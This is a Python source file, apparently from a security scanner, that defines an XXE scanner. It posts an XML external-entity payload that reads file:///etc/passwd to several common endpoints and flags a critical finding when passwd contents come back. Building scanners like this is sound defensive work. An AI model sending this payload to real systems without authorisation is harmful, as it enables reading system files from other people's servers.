import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import json
import xml.etree.ElementTree as ET

class XXEScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target

    def scan_xxe(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}"
        
        # XXE Payload aiming to read /etc/passwd or similar
        # Using a generic entity definition
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""

        if logger: logger(f"🕷️ XXE Audit: Testing XML endpoints on {base_url}...", "INFO")
        
        # Heuristic: Check if endpoint accepts XML or similar
        # We can try to POST this to common endpoints like /api, /soap, /xml
        endpoints = ["/api/xml", "/soap", "/xmlrpc", "/data"]

        for ep in endpoints:
            try:
                target_url = base_url + ep
                
                # 0. Baseline (GET/POST without payload)
                try:
                    baseline_r = http_client.post(target_url, options=getattr(self, "options", None), data="<root>test</root>", headers={'Content-Type': 'application/xml'}, timeout=3)
                    baseline_text = baseline_r.text if baseline_r.status_code == 200 else ""
                except:
                    baseline_text = ""

                headers = {'Content-Type': 'application/xml'}
                r = http_client.post(target_url, options=getattr(self, "options", None), data=payload, headers=headers, timeout=5)
                
                # Differential signature check
                sigs = ["root:x:0:0", "bin/bash", "/sbin/nologin", "boot loader", "[extensions]"]
                hit = False
                for sig in sigs:
                    if sig in r.text and sig not in baseline_text:
                        hit = True
                        break

                if hit:
                    from scan_engine.helpers.finding_normalizer import FindingNormalizer
                    findings.append(FindingNormalizer.from_response(
                        r,
                        title="Critical XXE Injection",
                        description=f"The XML parser at `{target_url}` is vulnerable to External Entity Injection.\nSuccessfully read system files via differential analysis.",
                        severity="critical",
                        confidence="high",
                        tool_source="xxe_scanner",
                        category="vuln",
                        payload=payload,
                        method="POST"
                    ))
                    if logger: logger(f"💀 XXE CONFIRMED: {target_url}", "CRITICAL")
            except Exception:
                pass
        return findings
